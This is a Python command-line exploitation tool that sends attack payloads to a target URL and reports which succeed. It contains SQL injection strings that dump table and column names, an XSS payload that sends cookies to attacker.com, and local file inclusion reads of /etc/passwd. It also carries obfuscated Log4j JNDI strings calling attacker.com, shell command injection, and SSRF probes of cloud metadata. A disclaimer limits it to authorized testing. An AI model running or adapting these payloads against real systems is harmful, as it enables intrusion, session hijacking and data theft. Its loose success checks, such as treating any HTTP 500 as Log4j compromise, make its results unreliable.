#!/usr/bin/env python3

"""
Proof of Concept Exploiter - Advanced Web Vulnerability Exploitation Tool
This tool demonstrates exploitation techniques for educational and authorized testing purposes only.
"""

import requests
import json
import urllib3
import argparse
import base64
import time
from urllib.parse import urljoin, urlparse
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PoCExploiter:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'PoC-Exploiter/1.0',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })
        self.exploitation_results = []
        
    def add_exploitation_result(self, vulnerability, success, details, payload_used):
        result = {
            'vulnerability': vulnerability,
            'success': success,
            'details': details,
            'payload_used': payload_used,
            'timestamp': datetime.now().isoformat()
        }
        self.exploitation_results.append(result)
        status = "✅ SUCCESS" if success else "❌ FAILED"
        print(f"[{status}] {vulnerability}: {details}")
        
    def exploit_sql_injection(self):
        """Demonstrate SQL injection exploitation"""
        print("\n[*] Exploiting SQL Injection...")
        
        # Basic SQL injection payloads for data extraction
        sql_payloads = [
            "' UNION SELECT 1,@@version,3,4,5--",
            "' UNION SELECT 1,database(),3,4,5--",
            "' UNION SELECT 1,user(),3,4,5--",
            "' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--"
        ]
        
        for payload in sql_payloads:
            try:
                url = f"{self.target_url}/test?id={payload}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for successful exploitation indicators
                if any(indicator in response.text.lower() for indicator in [
                    'mysql', 'postgresql', 'sqlite', 'mariadb', 'oracle'
                ]):
                    self.add_exploitation_result(
                        "SQL Injection Data Extraction",
                        True,
                        f"Database version/info extracted using: {payload}",
                        payload
                    )
                    return True
                    
            except requests.exceptions.RequestException:
                continue
                
        self.add_exploitation_result(
            "SQL Injection Data Extraction",
            False,
            "Could not extract database information",
            "Various SQL payloads"
        )
        return False
        
    def exploit_xss(self):
        """Demonstrate XSS exploitation"""
        print("\n[*] Exploiting Cross-Site Scripting...")
        
        # XSS payloads for cookie stealing and session hijacking
        xss_payloads = [
            "<script>alert('XSS_PoC_Cookie:'+document.cookie)</script>",
            "<img src=x onerror=alert('XSS_PoC:'+document.cookie)>",
            "<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>",
            "<svg onload=alert('PoC_Successful_XSS')>"
        ]
        
        for payload in xss_payloads:
            try:
                url = f"{self.target_url}/search?q={payload}"
                response = self.session.get(url, timeout=self.timeout)
                
                if payload in response.text:
                    self.add_exploitation_result(
                        "Cross-Site Scripting (XSS)",
                        True,
                        f"XSS payload executed: {payload[:50]}...",
                        payload
                    )
                    return True
                    
            except requests.exceptions.RequestException:
                continue
                
        self.add_exploitation_result(
            "Cross-Site Scripting (XSS)",
            False,
            "XSS payload not executed",
            "Various XSS payloads"
        )
        return False
        
    def exploit_lfi(self):
        """Demonstrate Local File Inclusion exploitation"""
        print("\n[*] Exploiting Local File Inclusion...")
        
        # LFI payloads for file access
        lfi_payloads = [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "../../../../windows/system32/drivers/etc/hosts",
            "expect://id",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        ]
        
        for payload in lfi_payloads:
            try:
                url = f"{self.target_url}/include?file={payload}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for successful file access
                if any(indicator in response.text for indicator in [
                    'root:x:', 'daemon:', 'www-data',
                    'PD9waH', 'base64', 'Windows'
                ]):
                    self.add_exploitation_result(
                        "Local File Inclusion (LFI)",
                        True,
                        f"File accessed using: {payload}",
                        payload
                    )
                    return True
                    
            except requests.exceptions.RequestException:
                continue
                
        self.add_exploitation_result(
            "Local File Inclusion (LFI)",
            False,
            "Could not access system files",
            "Various LFI payloads"
        )
        return False
        
    def exploit_log4j(self):
        """Demonstrate Log4j vulnerability exploitation"""
        print("\n[*] Exploiting Log4j (CVE-2021-44228)...")
        
        # Log4j JNDI injection payloads
        log4j_payloads = [
            "${jndi:ldap://attacker.com/exploit}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
            "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/exploit}"
        ]
        
        headers_to_test = ['User-Agent', 'X-Api-Version', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in log4j_payloads:
                try:
                    headers = {header: payload}
                    response = self.session.get(
                        self.target_url,
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    # Check for signs of successful exploitation
                    if response.status_code == 500 or 'jndi' in response.text.lower():
                        self.add_exploitation_result(
                            "Log4j RCE (CVE-2021-44228)",
                            True,
                            f"Log4j exploitation attempt via {header} header",
                            payload
                        )
                        return True
                        
                except requests.exceptions.RequestException:
                    continue
                    
        self.add_exploitation_result(
            "Log4j RCE (CVE-2021-44228)",
            False,
            "Log4j vulnerability not exploitable",
            "JNDI injection payloads"
        )
        return False
        
    def exploit_command_injection(self):
        """Demonstrate Command Injection exploitation"""
        print("\n[*] Exploiting Command Injection...")
        
        # Command injection payloads
        cmd_payloads = [
            "; id",
            "| id",
            "&& id",
            "$(id)",
            "; system('id')",
            "; cat /etc/passwd",
            "; whoami",
            "; pwd"
        ]
        
        for payload in cmd_payloads:
            try:
                url = f"{self.target_url}/execute?cmd={payload}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for command execution indicators
                if any(indicator in response.text for indicator in [
                    'uid=', 'gid=', 'groups=',
                    'root:x:', 'daemon:',
                    'Windows', 'Directory of'
                ]):
                    self.add_exploitation_result(
                        "Command Injection",
                        True,
                        f"Command executed: {payload}",
                        payload
                    )
                    return True
                    
            except requests.exceptions.RequestException:
                continue
                
        self.add_exploitation_result(
            "Command Injection",
            False,
            "Commands not executed",
            "Various command injection payloads"
        )
        return False
        
    def exploit_ssrf(self):
        """Demonstrate Server-Side Request Forgery exploitation"""
        print("\n[*] Exploiting Server-Side Request Forgery...")
        
        # SSRF payloads for internal access
        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:8080",
            "http://10.0.0.1:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://internal-admin-panel",
            "file:///etc/passwd"
        ]
        
        for payload in ssrf_payloads:
            try:
                url = f"{self.target_url}/fetch?url={payload}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for successful SSRF
                if any(indicator in response.text for indicator in [
                    'ami-id', 'instance-id', 'computeMetadata',
                    'root:x:', 'daemon:',
                    'Internal Server Error', 'Connection refused'
                ]):
                    self.add_exploitation_result(
                        "Server-Side Request Forgery (SSRF)",
                        True,
                        f"Internal resource accessed: {payload}",
                        payload
                    )
                    return True
                    
            except requests.exceptions.RequestException:
                continue
                
        self.add_exploitation_result(
            "Server-Side Request Forgery (SSRF)",
            False,
            "Could not access internal resources",
            "Various SSRF payloads"
        )
        return False
        
    def run_exploitation(self):
        """Run all exploitation attempts"""
        print(f"\n[*] Starting exploitation attempts for: {self.target_url}")
        print(f"[*] Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Run all exploitation techniques
        self.exploit_sql_injection()
        self.exploit_xss()
        self.exploit_lfi()
        self.exploit_log4j()
        self.exploit_command_injection()
        self.exploit_ssrf()
        
        # Generate summary
        successful_exploits = sum(1 for result in self.exploitation_results if result['success'])
        total_attempts = len(self.exploitation_results)
        
        print(f"\n[*] Exploitation completed!")
        print(f"[*] Successful exploits: {successful_exploits}/{total_attempts}")
        
        return self.exploitation_results
        
    def generate_poc_report(self):
        """Generate detailed proof of concept report"""
        report = {
            'exploitation_metadata': {
                'tool': 'PoC Exploiter - Advanced Web Vulnerability Exploitation',
                'version': '1.0.0',
                'target_url': self.target_url,
                'exploitation_date': datetime.now().isoformat(),
                'total_exploitation_attempts': len(self.exploitation_results)
            },
            'successful_exploits': [result for result in self.exploitation_results if result['success']],
            'failed_exploits': [result for result in self.exploitation_results if not result['success']],
            'summary': {
                'total_attempts': len(self.exploitation_results),
                'successful_count': sum(1 for result in self.exploitation_results if result['success']),
                'failed_count': sum(1 for result in self.exploitation_results if not result['success'])
            }
        }
        return report

def print_poc_banner():
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    Proof of Concept Exploitation Tool                     ║
║                            Web Vulnerability PoC                            ║
║                            Version 1.0.0 - Ethical                        ║
║                                                                              ║
║  ⚠️  WARNING: For authorized security testing ONLY!                        ║
║     Unauthorized use is illegal and unethical.                             ║
║                                                                              ║
║  📋 This tool demonstrates exploitation techniques for:                       ║
║     • SQL Injection • XSS • LFI • Log4j • Command Injection • SSRF        ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)

def main():
    print_poc_banner()
    
    parser = argparse.ArgumentParser(description='Proof of Concept Exploitation Tool')
    parser.add_argument('target_url', help='Target URL to exploit')
    parser.add_argument('-o', '--output', help='Output JSON report file')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--test-specific', choices=['sql', 'xss', 'lfi', 'log4j', 'cmd', 'ssrf'], 
                       help='Test specific vulnerability type')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.target_url.startswith(('http://', 'https://')):
        print("[!] Error: URL must start with http:// or https://")
        return
        
    print(f"[*] Target: {args.target_url}")
    print(f"[*] Timeout: {args.timeout} seconds")
    print("\n" + "="*80)
    
    # Create exploiter instance
    exploiter = PoCExploiter(args.target_url, timeout=args.timeout)
    
    # Run exploitation
    results = exploiter.run_exploitation()
    
    # Generate report
    report = exploiter.generate_poc_report()
    
    # Display detailed results
    print("\n" + "="*80)
    print("                        DETAILED EXPLOITATION RESULTS")
    print("="*80)
    
    for result in results:
        status = "✅ SUCCESS" if result['success'] else "❌ FAILED"
        print(f"\n[{status}] {result['vulnerability']}")
        print(f"  Details: {result['details']}")
        print(f"  Payload: {result['payload_used']}")
        print(f"  Time: {result['timestamp']}")
    
    # Save report if requested
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] PoC report saved to: {args.output}")
    
    print("\n" + "="*80)
    print("⚠️  ETHICAL DISCLAIMER:")
    print("="*80)
    print("This tool was used for authorized security testing purposes only.")
    print("Always obtain proper authorization before testing any system.")
    print("Report any discovered vulnerabilities responsibly to the appropriate parties.")
    print("="*80)

if __name__ == "__main__":
    main()